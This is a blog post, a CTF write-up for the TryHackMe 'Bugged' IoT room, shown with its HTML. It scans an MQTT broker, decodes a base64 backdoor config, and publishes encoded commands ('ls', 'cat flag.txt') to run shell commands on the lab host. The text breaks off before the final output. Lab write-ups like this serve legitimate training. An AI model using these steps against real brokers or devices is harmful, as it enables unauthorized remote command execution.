<!DOCTYPE html><html lang="en-gb"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Bugged Tryhackme CTF Writeup - Offens!ve Blogs - Sakibul Ali Khan</title><meta name="description" content="John was working on his smart home appliances when he noticed weird traffic going across the network. Can you help him figure out what these weird&hellip;"><meta name="generator" content="Publii Open-Source CMS for Static Site"><link rel="stylesheet" href="https://sakibulalikhan.pages.dev/media/plugins/syntaxHighlighter/prism-black.css"><script type="text/javascript" async src="https://www.googletagmanager.com/gtag/js?id=G-BG46SGW391"></script><script type="text/javascript">window.dataLayer = window.dataLayer || [];
				  function gtag(){dataLayer.push(arguments);}
				  gtag('js', new Date());
				  gtag('config', 'G-BG46SGW391' , { 'anonymize_ip': true });
				  <!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-BG46SGW391"></script><script>window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-BG46SGW391');</script><link rel="canonical" href="https://sakibulalikhan.pages.dev/bugged-tryhackme-ctf-writeup.html"><link rel="alternate" type="application/atom+xml" href="https://sakibulalikhan.pages.dev/feed.xml"><link rel="alternate" type="application/json" href="https://sakibulalikhan.pages.dev/feed.json"><meta property="og:title" content="Bugged Tryhackme CTF Writeup"><meta property="og:image" content="https://sakibulalikhan.pages.dev/media/posts/5/Bugged-Tryhackme-CTF-Writeup.jpg"><meta property="og:image:width" content="474"><meta property="og:image:height" content="266"><meta property="og:site_name" content="Offens!ve Blogs - Sakibul Ali Khan"><meta property="og:description" content="John was working on his smart home appliances when he noticed weird traffic going across the network. Can you help him figure out what these weird&hellip;"><meta property="og:url" content="https://sakibulalikhan.pages.dev/bugged-tryhackme-ctf-writeup.html"><meta property="og:type" content="article"><meta name="twitter:card" content="summary"><meta name="twitter:site" content="@sakibulalikhan"><meta name="twitter:title" content="Bugged Tryhackme CTF Writeup"><meta name="twitter:description" content="John was working on his smart home appliances when he noticed weird traffic going across the network. Can you help him figure out what these weird&hellip;"><meta name="twitter:image" content="https://sakibulalikhan.pages.dev/media/posts/5/Bugged-Tryhackme-CTF-Writeup.jpg"><link rel="shortcut icon" href="https://sakibulalikhan.pages.dev/media/website/pen-tux.png" type="image/png"><link rel="preload" href="https://sakibulalikhan.pages.dev/assets/dynamic/fonts/montserrat/montserrat.woff2" as="font" type="font/woff2" crossorigin><link rel="preload" href="https://sakibulalikhan.pages.dev/assets/dynamic/fonts/montserrat/montserrat-italic.woff2" as="font" type="font/woff2" crossorigin><link rel="stylesheet" href="https://sakibulalikhan.pages.dev/assets/css/style.css?v=d3170d9137f351ef73d43008f93848aa"><script type="application/ld+json">{"@context":"http://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://sakibulalikhan.pages.dev/bugged-tryhackme-ctf-writeup.html"},"headline":"Bugged Tryhackme CTF Writeup","datePublished":"2022-05-03T10:40+06:00","dateModified":"2024-11-30T23:48+06:00","image":{"@type":"ImageObject","url":"https://sakibulalikhan.pages.dev/media/posts/5/Bugged-Tryhackme-CTF-Writeup.jpg","height":266,"width":474},"description":"John was working on his smart home appliances when he noticed weird traffic going across the network. Can you help him figure out what these weird&hellip;","author":{"@type":"Person","name":"Sakibul Ali Khan","url":"https://sakibulalikhan.pages.dev/authors/sakibulalikhan/"},"publisher":{"@type":"Organization","name":"Sakibul Ali Khan","logo":{"@type":"ImageObject","url":"https://sakibulalikhan.pages.dev/media/website/pen-tux-2.png","height":500,"width":500}}}</script><noscript><style>img[loading] {
                    opacity: 1;
                }</style></noscript><script type="text/javascript">(function(c,l,a,r,i,t,y){
        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
    })(window, document, "clarity", "script", "kza4v42pst");</script><style>.extlink::after {
				background-color: currentColor;
				content: "";
				display: inline-block;
				height: 16px; 
				margin-left: 5px;
				position: relative;
				top: 0px;
				width: 16px; 
			}
		.extlink.extlink-icon-5::after { mask-image: url("data:image/svg+xml;utf8,<svg viewBox='0 0 24 24' fill='none' stroke='%23000000' stroke-width='2' stroke-linecap='round' stroke-linejoin='round' xmlns='http://www.w3.org/2000/svg'><path d='M22 12A10 10 0 1 1 12 2'/><path d='M22 2 12 12'/><path d='M16 2h6v6'/></svg>"); }</style></head><body class="post-template"><div class="container container--center"><script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="sakibulalikhan" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FF813F" data-position="Right" data-x_margin="18" data-y_margin="18"></script><script defer="defer" src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon='{"token": "22757d4facf2459dbb19685ef5c4bae1"}'></script><header class="header"><div class="header__logo"><a class="logo" href="https://sakibulalikhan.pages.dev/"><img src="https://sakibulalikhan.pages.dev/media/website/pen-tux-2.png" alt="Offens!ve Blogs - Sakibul Ali Khan" width="500" height="500"></a></div><nav class="navbar js-navbar"><button class="navbar__toggle js-toggle" aria-label="Menu" aria-haspopup="true" aria-expanded="false"><span class="navbar__toggle-box"><span class="navbar__toggle-inner">Menu</span></span></button><ul class="navbar__menu"><li><a href="https://sakibulalikhan.pages.dev/" target="_self">Home</a></li><li class="has-submenu"><a href="https://sakibulalikhan.pages.dev/tags/ctf-writeups/" target="_self" aria-haspopup="true">CTF Writeups</a><ul class="navbar__submenu level-2" aria-hidden="true"><li><a href="https://sakibulalikhan.pages.dev/tags/hackthebox/" title="HackTheBox" target="_self">HackTheBox</a></li><li><a href="https://sakibulalikhan.pages.dev/tags/tryhackme/" title="TryHackMe" target="_self">TryHackMe</a></li><li><a href="https://sakibulalikhan.pages.dev/tags/hackviser/" title="Hackviser" target="_self">Hackviser</a></li><li><a href="https://sakibulalikhan.pages.dev/tags/ctftime/" title="CTFtime" target="_self">CTFtime</a></li></ul></li><li><a href="https://sakibulalikhan.pages.dev/about.html" title="About Me" target="_self">About</a></li><li><a href="https://docs.google.com/document/d/10NGJ-Hn7zm6TEEfJIg3K3gqg3wLZ-6BLT77npYOHm4k/edit" title="Sakibul Ali Khan - Resume" target="_blank" rel="Sakibul Ali Khan">Resume</a></li><li><a href="https://sakibulalikhan.pages.dev/contact.html" title="Contact" target="_self">Contact</a></li></ul></nav></header><main class="content"><article class="post"><header><h1 class="post__title">Bugged Tryhackme CTF Writeup</h1><div class="post__meta"><time datetime="2022-05-03T10:40" class="post__date">May 3, 2022 </time><span class="post__author"><a href="https://sakibulalikhan.pages.dev/authors/sakibulalikhan/" class="feed__author">Sakibul Ali Khan</a></span></div><div class="post__tags"><a href="https://sakibulalikhan.pages.dev/tags/ctf-writeups/" class="invert">CTF Writeups</a> <a href="https://sakibulalikhan.pages.dev/tags/iot/" class="invert">IoT</a> <a href="https://sakibulalikhan.pages.dev/tags/iot-security/" class="invert">IoT Security</a> <a href="https://sakibulalikhan.pages.dev/tags/pentesting/" class="invert">Pentesting</a> <a href="https://sakibulalikhan.pages.dev/tags/tryhackme/" class="invert">TryHackMe</a></div></header><figure class="post__image post__cover"><img src="https://sakibulalikhan.pages.dev/media/posts/5/Bugged-Tryhackme-CTF-Writeup.jpg" srcset="https://sakibulalikhan.pages.dev/media/posts/5/responsive/Bugged-Tryhackme-CTF-Writeup-xs.jpg 300w, https://sakibulalikhan.pages.dev/media/posts/5/responsive/Bugged-Tryhackme-CTF-Writeup-sm.jpg 480w, https://sakibulalikhan.pages.dev/media/posts/5/responsive/Bugged-Tryhackme-CTF-Writeup-md.jpg 768w, https://sakibulalikhan.pages.dev/media/posts/5/responsive/Bugged-Tryhackme-CTF-Writeup-lg.jpg 1024w" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" loading="eager" height="266" width="474" alt="Bugged Tryhackme CTF Writeup"></figure><div class="post__entry"><div class="post__entry"><p id="ee57" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">John</strong> was working on his smart home appliances when he noticed weird traffic going across the network. Can you help him figure out what these weird network communications are?</p><p id="a92b" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj"><strong>Difficulty =</strong> Easy</p><p id="c5ce" class="pw-post-body-paragraph xw xx tu ly b xy abh ya yb yc abi ye yf li abj yh yi ln abk yk yl ls abl yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Challenges:</strong><span class="ly kz"> Network Analyze, IoT Hacking.</span></p><p id="f868" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Beginning start with Rustscan. For scan, we use ‘-a’ flag to specify our target. And we also use ‘-r’ flag to set port ranges.</p><pre class="language-bash line-numbers"><code>sak@kali~ rustscan -a 10.10.232.80 -r 1-5000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/sak/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1073741716'.
Open 10.10.232.80:1883
[~] Starting Script(s)
[&gt;] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-05 12:52 +06
Initiating Ping Scan at 12:52
Scanning 10.10.232.80 [2 ports]
Completed Ping Scan at 12:52, 0.24s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:52
Completed Parallel DNS resolution of 1 host. at 12:52, 0.30s elapsed
DNS resolution of 1 IPs took 0.30s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:52
Scanning 10.10.232.80 [1 port]
Discovered open port 1883/tcp on 10.10.232.80
Completed Connect Scan at 12:52, 0.25s elapsed (1 total ports)
Nmap scan report for 10.10.232.80
Host is up, received conn-refused (0.25s latency).
Scanned at 2023-03-05 12:52:49 +06 for 1s

PORT     STATE SERVICE REASON
1883/tcp open  mqtt    syn-ack</code></pre><p id="d3fd" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">It looks like there is 1 a service running. In target machine service ‘MQTT’ is running on TCP port ‘1883’.</p><h2 id="2f82" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj">Basic Information About ‘MQTT’</h2><p id="dc0e" class="pw-post-body-paragraph xw xx tu ly b xy abh ya yb yc abi ye yf li abj yh yi ln abk yk yl ls abl yn yo yp fp bj" data-selectable-paragraph="">MQTT stands for MQ Telemetry Transport. It is a publish/subscribe, <strong class="ly kz">extremely simple, and lightweight messaging protocol</strong>, designed for constrained devices and low-bandwidth, high-latency, or unreliable networks. The design principles are to minimize network bandwidth and device resource requirements whilst also attempting to ensure reliability and some degree of assurance of delivery. These principles also turn out to make the protocol ideal for the emerging “machine-to-machine” (M2M) or “Internet of Things” world of connected devices, and for mobile applications where bandwidth and battery power are at a premium.</p><p id="253d" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Default port:</strong> 1883</p><figure class="yq yr ys yt yu yv kl km paragraph-image"><div class="kl km aoc"><figure class="bg yx yy c"><figure class="is-loaded"><img decoding="async" src="https://miro.medium.com/v2/resize:fit:663/0*_zH7lb_3H1yrrcAU.png" alt="Bugged Tryhackme CTF Writeup" width="663" height="534" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure></div><figcaption class="yz za zb kl km zc zd be b bf z dl" data-selectable-paragraph="">Basic Information About ‘MQTT’</figcaption></figure><p id="51f5" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now our second step began here. At this moment we start the Nmap scan to know more about the service that is running on the server.</p><p id="3d37" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">For Nmap scan, we use ‘-sV’ flag to know about services &amp; versions. And we use ‘-sC’ flag to default script scan. We also use ‘-p’ flag to specify which port we want to scan.</p><pre class="language-bash line-numbers"><code> sak@kali~ sudo nmap -sV -sC -p 1883 10.10.232.80
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-05 13:08 +06
Nmap scan report for 10.10.232.80
Host is up (0.25s latency).

PORT     STATE SERVICE                  VERSION
1883/tcp open  mosquitto version 2.0.14
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|     $SYS/broker/load/bytes/received/1min: 4410.65
|     $SYS/broker/load/publish/sent/5min: 4.71
|     $SYS/broker/load/messages/sent/15min: 85.18
|     $SYS/broker/clients/connected: 2
|     $SYS/broker/load/connections/5min: 0.39
|     livingroom/speaker: {"id":15127941740320722645,"gain":46}
|     $SYS/broker/messages/sent: 3575
|     $SYS/broker/load/sockets/15min: 0.22
|     $SYS/broker/store/messages/count: 34
|     $SYS/broker/messages/stored: 34
|     $SYS/broker/publish/messages/sent: 52
|     $SYS/broker/clients/active: 2
|     $SYS/broker/subscriptions/count: 3
|     $SYS/broker/store/messages/bytes: 369
|     $SYS/broker/publish/bytes/received: 119484
|     storage/thermostat: {"id":14536458125521088285,"temperature":23.189959}
|     patio/lights: {"id":8415478818146317759,"color":"WHITE","status":"OFF"}
|     kitchen/toaster: {"id":9223877754878364611,"in_use":true,"temperature":156.5998,"toast_time":210}
|     $SYS/broker/version: mosquitto version 2.0.14
|     $SYS/broker/bytes/received: 167321
|     frontdeck/camera: {"id":5624806846270235642,"yaxis":143.5409,"xaxis":-37.70204,"zoom":4.5788803,"movement":false}
|     $SYS/broker/clients/maximum: 2
|     $SYS/broker/messages/received: 3524
|     $SYS/broker/load/bytes/received/15min: 3970.90
|     $SYS/broker/retained messages/count: 36
|     $SYS/broker/load/bytes/received/5min: 4291.50
|     $SYS/broker/publish/bytes/sent: 291
|     $SYS/broker/load/publish/sent/1min: 21.93
|     $SYS/broker/load/sockets/1min: 1.83
|     $SYS/broker/load/connections/15min: 0.14
|     $SYS/broker/load/connections/1min: 1.83
|     $SYS/broker/uptime: 2343 seconds
|     $SYS/broker/load/sockets/5min: 0.42
|     $SYS/broker/load/messages/sent/5min: 95.12
|     $SYS/broker/load/messages/sent/1min: 113.75
|     $SYS/broker/load/messages/received/5min: 90.41
|     $SYS/broker/load/messages/received/1min: 91.82
|     $SYS/broker/load/publish/sent/15min: 1.59
|     $SYS/broker/load/messages/received/15min: 83.59
|     $SYS/broker/load/bytes/sent/5min: 552.51
|     $SYS/broker/load/bytes/sent/15min: 398.79
|     $SYS/broker/load/bytes/sent/1min: 1255.39
|     $SYS/broker/clients/total: 2
|_    $SYS/broker/bytes/sent: 16314

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.10 seconds</code></pre><p id="8551" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">For ferther scan we use ‘mosquitto’ tool. If your device does have not this tool you can install it by this simple command.</p><pre class="language-bash line-numbers"><code>sudo apt-get install mosquitto mosquitto-clients -y</code></pre><p id="a423" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now we use “mosquitto_sub” and use ‘-t’ flag to specifying the topic and also use ‘-h’ flag to specify the host address. If we give any topic in in ‘-t’ flag then we’ll get information about that topic. But here we want information about all topics. So, on ‘-t’ flag we use the wildcard “#” for this operation.</p><pre class="language-bash line-numbers"><code>sak@kali~ mosquitto_sub -t "#" -h 10.10.232.80
{"id":6303134845423256684,"gain":45}
{"id":7062282878224178102,"color":"GREEN","status":"ON"}
{"id":5297822194260674402,"temperature":24.360235}
{"id":2860013371319219134,"temperature":24.233936}
{"id":5845551519049790310,"gain":61}
{"id":14786151255640681934,"color":"RED","status":"OFF"}
{"id":11637714936854629483,"in_use":false,"temperature":158.6413,"toast_time":207}
{"id":12972826565605654962,"temperature":23.58}
{"id":5464270745344776246,"yaxis":88.01166,"xaxis":-120.650795,"zoom":3.0464551,"movement":false}
{"id":3711207335622492878,"gain":55}
{"id":7536635942787451007,"color":"GREEN","status":"OFF"}
{"id":14890795244202004796,"temperature":23.076757}
{"id":2458810731003226774,"in_use":true,"temperature":144.60513,"toast_time":251}
{"id":9928724913760140067,"gain":73}
{"id":6498368860634934991,"temperature":24.349384}
{"id":3598942894745952976,"color":"RED","status":"ON"}
{"id":12888160293013420529,"yaxis":124.13611,"xaxis":175.50891,"zoom":0.9612895,"movement":true}
{"id":7852150045648343267,"in_use":false,"temperature":153.8073,"toast_time":121}
{"id":17285335294252743187,"gain":54}
{"id":11505589973457021977,"temperature":23.719482}
eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==
{"id":16076301308523402932,"color":"RED","status":"ON"}
{"id":7411803660708968315,"gain":60}
{"id":18348470723758418035,"temperature":23.625862}
{"id":12464564460746554731,"in_use":true,"temperature":150.03351,"toast_time":297}
{"id":652803559971738546,"color":"GREEN","status":"ON"}
{"id":6540437519393488331,"temperature":23.25789}
{"id":5951090730247747994,"yaxis":76.82907,"xaxis":-96.71407,"zoom":1.7843343,"movement":false}
{"id":12233324324560130586,"gain":49}</code></pre><p id="80a3" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">In this operation we got something interesting thing:</p><pre class="language-bash line-numbers"><code>“eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==”</code></pre><p id="66fc" class="xw xx abt ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj" data-selectable-paragraph="">They asked us, “Can you help him figure out what these weird network communications are?” Yes, got something weird on network communications.</p><p id="fedf" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">This is base64 encoded. So, let’s decode this and see what we got.</p><pre class="language-bash line-numbers"><code> sak@kali ~ echo "eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==" | base64 -d

{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","registered_commands":["HELP","CMD","SYS"],"pub_topic":"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub","sub_topic":"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"}%  </code></pre><p id="3a0f" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">After decoding there is registered_command and publiser_topic also subscriber_topic.</p><p id="75c6" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">In this MQTT model publisher always publish data and the subscriber always receives data but the subscriber can’t tell the publisher or IoT device what to do or what to publish (cause it is precoded). So, there might be a security vulnerability. We have to find out :)</p><p id="6e63" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">In decoded section, this publisher topic “U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub” is registered with the commands “HELP”,”CMD”,”SYS”. Let’s check What can do with this stuff.</p><p id="297d" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now we try to receive data from the publisher. So, We have to start our subscribers. For that use this command.</p><pre class="language-bash line-numbers"><code>sak@kali ~ mosquitto_sub -t "U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub" -h 10.10.20.204</code></pre><p id="e29d" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now we going to simulate the IoT device. For that, we use subscriber id “XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub‘ and send a message to the subscriber.</p><pre class="language-bash line-numbers"><code>mosquitto_pub -t "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub" -m "simple_massage" -h 10.10.20.204</code></pre><p id="2817" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">In here ‘-m’ flag for our massage. Let’s check what subscribers got.</p><pre class="language-bash line-numbers"><code> sak@kali ~ mosquitto_sub -t "U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub" -h 10.10.20.204

SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk=</code></pre><p id="2e16" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Another base64 encoded string. Now we are going to decode the base64 string.</p><pre class="language-bash line-numbers"><code> sak@kali ~ echo "SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk=" | base64 -d
Invalid message format.
Format: base64({"id": "&lt;backdoor id&gt;", "cmd": "&lt;command&gt;", "arg": "&lt;argument&gt;"})%</code></pre><p id="fd8f" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Interesting! we got a massage format and the communication is base64 decoded. Here MQTT was expecting a base64 decoded massage and also want ‘id’, ‘cmd’, and ‘arg’. So, let’s make things right.</p><p id="c803" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Beginning we got ‘id’ = “cdd1b1c0–1c40–4b0f-8e22–61b357548b7d” and it’s accepting cmd “‘HELP’, ‘CMD’, ‘SYS’”. We are going to use “CMD’ and as ‘arg’ we are going to use “ls”.</p><p id="72c3" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">The massage will be:</p><pre class="language-bash line-numbers"><code>{"id": "cdd1b1c0–1c40–4b0f-8e22–61b357548b7d", "cmd": "CMD", "arg": "ls"}</code></pre><p id="57c9" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now we need to encode it on base:</p><pre class="language-json line-numbers"><code>“e2lkOiAiY2RkMWIxYzDigJMxYzQw4oCTNGIwZi04ZTIy4oCTNjFiMzU3NTQ4YjdkIiwgY21kOiAiQ01EIiwgYXJnOiAibHMifQ==”</code></pre><p id="02d3" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now we send this base64 string as a massage. Our command will be:</p><pre class="language-bash line-numbers"><code>sak@kali ~ mosquitto_pub -t "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub" -m "e2lkOiAiY2RkMWIxYzDigJMxYzQw4oCTNGIwZi04ZTIy4oCTNjFiMzU3NTQ4YjdkIiwgY21kOiAiQ01EIiwgYXJnOiAibHMifQ==" -h 10.10.20.204</code></pre><p id="d217" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">We received something encoded in base64.</p><pre class="language-bash line-numbers"><code>sak@kali ~ mosquitto_sub -t "U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub" -h 10.10.20.204

eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZy50eHRcbij9</code></pre><p id="8764" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">After Decode the base64 string finds a text file called “<code>flag .txt</code>”</p><pre class="language-bash line-numbers"><code> sak@kali ~ echo "eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZy50eHRcbij9" | base64 -d

{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"flag.txt\n}</code></pre><p id="0704" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">So, Let’s grab our flag. For that, we have to change the argument. And it will be ‘<code>arg</code>’ “<code>cat flag.txt</code>”</p><pre class="language-bash line-numbers"><code>{"id": "cdd1b1c0–1c40–4b0f-8e22–61b357548b7d", "cmd": "CMD", "arg": "cat flag.txt"}</code></pre><pre class="language-bash line-numbers"><code> sak@kali ~ echo "{"id": "cdd1b1c0–1c40–4b0f-8e22–61b357548b7d", "cmd": "CMD", "arg": "cat flag.txt"}" | base64

e2lkOiBjZGQxYjFjMOKAkzFjNDDigJM0YjBmLThlMjLigJM2MWIzNTc1NDhiN2QsIGNtZDogQ01E
LCBhcmc6IGNhdCBmbGFnLnR4dH0K</code></pre><p id="d204" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">We have to decode it in base64 then we send another massage.</p><pre class="language-bash line-numbers"><code>sak@kali ~ mosquitto_pub -t "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub" -m "e2lkOiBjZGQxYjFjMOKAkzFjNDDigJM0YjBmLThlMjLigJM2MWIzNTc1NDhiN2QsIGNtZDogQ01E
LCBhcmc6IGNhdCBmbGFnLnR4dH0K" -h 10.10.20.204</code></pre><p id="164d" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">In our subscriber part, we receive another base64 massage.</p><pre class="language-bash line-numbers"><code>sak@kali ~ mosquitto_sub -t "U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub" -h 10.10.20.204

